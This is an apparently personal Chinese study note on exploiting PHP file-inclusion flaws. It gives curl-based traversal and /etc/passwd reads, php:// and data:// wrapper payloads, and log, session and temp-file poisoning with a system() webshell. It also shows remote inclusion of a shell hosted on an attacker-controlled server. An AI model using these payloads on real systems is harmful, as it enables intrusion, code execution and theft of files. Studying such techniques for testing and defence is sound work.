## 目录

- [[#一、文件包含基础|一、文件包含基础]]
- [[#二、LFI 挖掘与利用|二、LFI 挖掘与利用]]
- [[#三、php封装器包含|三、php封装器包含]]
- [[#四、日志与Session包含|四、日志与Session包含]]
- [[#五、临时文件包含|五、临时文件包含]]
- [[#六、RFI 远程包含|六、RFI 远程包含]]
- [[#七、包含到RCE的路径总结|七、包含到RCE的路径总结]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、文件包含基础

### include 家族

| 函数 | 行为 | 攻击意义 |
|------|------|---------|
| `include` | 包含失败警告，继续执行 | 宽松，可继续注入 |
| `include_once` | 只包含一次 | 同上 |
| `require` | 包含失败致命错误，停止 | 影响后续语句 |
| `require_once` | 同上，只包含一次 | |

```php
<?php
// 经典漏洞模式
$page = $_GET['page'];
include($page . ".php");    // 追加后缀 → 需绕过
include("pages/" . $page);  // 拼接目录前缀
include($page);             // 无任何限制 → 直接任意包含
?>
```

### 包含执行语义（关键）

| 包含文件内容 | 结果 |
|-------------|------|
| 纯 PHP 代码 | 直接执行 |
| 纯文本 | 原样输出（无执行） |
| PHP 代码混文本 | 标签内执行，标签外输出 |
| 非文本文件（图片/二进制） | 按文本输出，可注入马后包含 |

> 这就是"图片马"的原理：图片里塞 `<?php system($_GET['c']);?>`，GIF 文件头 + PHP 代码 → include 时标签内代码执行。

---

## 二、LFI 挖掘与利用

### 参数特征

| 参数名 | 典型值 | 对应漏洞 |
|--------|--------|---------|
| `page` | `home` | LFI |
| `file` | `config` | LFI |
| `lang` | `en` | LFI |
| `template` | `default` | LFI |
| `theme` | `dark` | LFI |
| `include` | `about` | LFI |
| `download` | `report.pdf` | 任意文件读取/下载 |

```text
?page=home
?file=index
?lang=en
?template=default
```

### 挖掘手法

```bash
# 参数 fuzzing
curl -s "http://target/index.php?page=../../../../etc/passwd"
curl -s "http://target/index.php?file=/etc/passwd"
curl -s "http://target/index.php?file=../../../../etc/passwd%00"

# 批量（字典）
for p in page file lang template theme include; do
  curl -s "http://target/index.php?$p=../../../../etc/passwd" | grep -q root && echo "HIT: $p"
done
```

### 目录穿越

```bash
# 从 Web 根到系统根
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd      # 部分过滤 ../
?file=..%2f..%2f..%2fetc%2fpasswd       # URL 编码
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd    # 全编码
?file=....%2f....%2f....%2fetc/passwd   # 双写组合
```

### 后缀 .php 绕过

| 绕过方式 | 载荷 | 适用 |
|----------|------|------|
| `%00` 截断 | `?file=../../etc/passwd%00` | PHP < 5.3.4 |
| 路径截断 | `?file=../../etc/passwd/./././` | PHP 5.x，长度 > 4096 时截断 |
| filter 封装 | `?file=php://filter/convert.base64-encode/resource=config` | 后缀追加不生效于 filter 流（部分版本） |
| 伪协议配合 | `?file=data://text/plain,<?php ...?>` | include 拼接 `.php` 时 data 流仍执行（老版本） |

---

## 三、php封装器包含

### 完整封装器速查

| 封装器 | 用途 | 开启条件 |
|--------|------|---------|
| `php://filter/convert.base64-encode/resource=X` | 读源码 | 默认开启 |
| `php://input` | POST body 当内容 | `allow_url_include=On` |
| `data://text/plain,CODE` | 内联代码 | `allow_url_include=On` |
| `expect://CMD` | 直接执行命令 | `expect` 扩展 |
| `php://temp` / `php://memory` | 临时流 | 写文件场景 |
| `phar://x.phar/y` | phar 反序列化 | 见 07 章 |
| `zip://x.zip#y` | zip 内文件 | zip 扩展 |

```bash
# 读源码
curl "URL?file=php://filter/convert.base64-encode/resource=config" | base64 -d

# POST 打码
curl -X POST "URL?file=php://input&c=id" --data '<?php system($_GET["c"]);?>'

# data 打码
curl "URL?file=data://text/plain,<?php system('id');?>"

# expect（少见但高价值）
curl "URL?file=expect://id"
```

### filter 链（进阶）

```bash
# 组合编码链，绕过对关键字过滤
?file=php://filter/read=string.rot13/resource=config
?file=php://filter/read=convert.base64-encode|convert.base64-decode/resource=config
?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=config
```

| 链 | 效果 |
|----|------|
| `string.rot13` | ROT13 编码读 |
| `convert.iconv.*` | 编码转换（可用于绕过关键字检测） |
| `zlib.deflate` / `zlib.inflate` | 压缩读 |
| `php://filter/resource=...` | 无 read 时原样读（会执行 PHP，非 Base64 情况） |

---

## 四、日志与Session包含

### 日志投毒（无文件上传时首选）

```bash
# 1. 污染 User-Agent（或 Referer）
curl -A '<?php system($_GET["c"]);?>' "http://target/index.php"

# 2. 包含 access.log
curl "http://target/index.php?file=../../../../var/log/apache2/access.log&c=id"
```

| 注入点 | 文件 |
|--------|------|
| User-Agent | access.log / error.log |
| Referer | access.log |
| 任意 GET 参数 | access.log（参数也在日志里） |
| 特殊请求头 | access.log（`CustomLog` 可记录任意头） |

> 高并发写入日志时包含可能截断导致 PHP 标签不完整 → 多刷几次，或让 `<?php` 紧贴行首。

### Session 包含

```bash
# 1. 用任意可控 session 值写入代码
#    如登录框用户名、语言选择等写入 $_SESSION
# 2. 伪造 PHPSESSID 并包含对应文件
curl -b "PHPSESSID=payload" "http://target/index.php?file=/var/lib/php/sessions/sess_payload"
```

| 系统 | session 路径 |
|------|-------------|
| Debian/Ubuntu | `/var/lib/php/sessions/` |
| CentOS/RHEL | `/var/lib/php/session/` |
| 自定义 | `php -i \| grep session.save_path` |

### 其他可包含文件

| 文件 | 用法 |
|------|------|
| `/proc/self/environ` | 环境变量含请求头 → UA 投毒 |
| `/proc/self/fd/N` | 打开的文件描述符（上传的临时文件） |
| `/tmp/sess_xxx` | 见上 |
| 上传临时文件 | `/tmp/phpXXXXXX`（见下节） |
| 邮件/日志 | `/var/log/mail.log`、`/var/log/messages` |
| 远程 URL | RFI（见六节） |

---

## 五、临时文件包含

### PHP 上传临时文件

PHP 上传文件时先在 `/tmp` 生成随机临时文件（`phpXXXXXX`），请求结束后删除。若目标**先包含后删除**（竞态），可抓取临时文件：

```bash
# 上传+并发包含（多线程循环）
while true; do
  curl -s -F "file=@/tmp/evil.php" "http://target/index.php?file=/tmp/phpXXXXXX" &
  curl -s "http://target/index.php?file=/tmp/phpXXXXXX&c=id"
done
```

```bash
# /proc/self/fd 遍历上传临时文件描述符
for i in $(seq 0 100); do
  curl -s "http://target/index.php?file=../../../../proc/self/fd/$i" 
done
```

> 实战常用工具：Linux 下 `php_filter_chain_generator`（无临时文件时用 filter 链生成任意代码），或用条件竞争脚本爆破 fd。

### 无临时文件时的 filter 链 RCE

PHP 7.x 存在一个通用技巧：**只用 `php://filter` 链即可生成任意 PHP 代码**（利用 iconv 转换链，无需文件上传、无需 allow_url_include）：

```text
payload 结构:
php://filter/convert.iconv....|convert.base64-decode|.../resource=php://temp
```

> 该技巧由 Synacktiv 研究公开，工具：`php_filter_chain_generator.py`。篇幅所限不展开字节级构造，实战直接调用工具生成。

---

## 六、RFI 远程包含

### 条件

| ini 项 | 值 | 说明 |
|--------|-----|------|
| `allow_url_include` | `On` | **必须**（PHP 5.2 后默认 Off） |
| `allow_url_fopen` | `On` | 通常默认 On |

```bash
# 确认目标
# 1. 读 php.ini 或 phpinfo 页面
# 2. 本地 -d allow_url_include=1 模拟同版本行为
```

### 利用

```bash
# 远程 shell.txt（内容: <?php system($_GET['c']);?>）
echo '<?php system($_GET["c"]);?>' > /tmp/payloads/shell.txt
php -S 0.0.0.0:8888 -t /tmp/payloads

# 目标包含
curl "http://target/index.php?file=http://your-ip:8888/shell.txt&c=id"
```

### data:// 也是 RFI 变种

```bash
curl "http://target/index.php?file=data://text/plain,<?php phpinfo();?>"
```

---

## 七、包含到RCE的路径总结

```text
发现 include($_GET[file])
  │
  ├─ 后缀/过滤限制?
  │    ├─ %00 截断（PHP<5.3.4）
  │    ├─ 路径截断
  │    └─ filter 封装器绕过
  │
  ├─ allow_url_include=On?
  │    ├─ php://input POST 打码
  │    ├─ data:// 打码
  │    └─ RFI 远程文件
  │
  ├─ 本地有可写入口?
  │    ├─ 上传 → 临时文件包含 / 图片马
  │    ├─ Session 文件包含
  │    ├─ 日志投毒（UA/Referer）
  │    └─ /proc/self/environ
  │
  └─ 都没有?
       └─ php://filter 链 RCE（PHP 7.x，工具生成）
```

### 读文件 vs 执行判定

| 现象 | 结论 |
|------|------|
| 返回 Base64 | filter 生效 → 可读源码 |
| 返回页面内容/报错 | 直接包含 → 可找执行路径 |
| `include(): Failed opening` | 路径不对 → 调整穿越层数 |
| 空白但 200 | 包含成功但内容为空/被过滤 |

---

## 八、红队视角总结

| 知识点 | 要点 |
|--------|------|
| 包含函数 | `include/require/include_once`，内容=执行语义 |
| 挖掘 | `page/file/lang/template` 等参数 + 穿越字典 |
| 读源码 | `php://filter/convert.base64-encode/resource=X` |
| 执行代码 | `php://input`、`data://`、RFI、日志/Session/临时文件 |
| 无输入时的 RCE | php filter 链生成器（PHP 7.x） |
| 加固视角 | `allow_url_include=Off`、白名单 include、`open_basedir` |

**关联**：
- 终端命令细节见 [[04-终端PHP与curl封装器实战|04 终端 PHP 与 curl 封装器实战]]
- 实战扩展见 [[../../archstrike-web教学/06-文件包含与命令注入|archstrike 文件包含与命令注入]]

---

**返回** [[PHP基础总目录|PHP 总目录]] | [[../前端基础总目录|前端基础总目录]]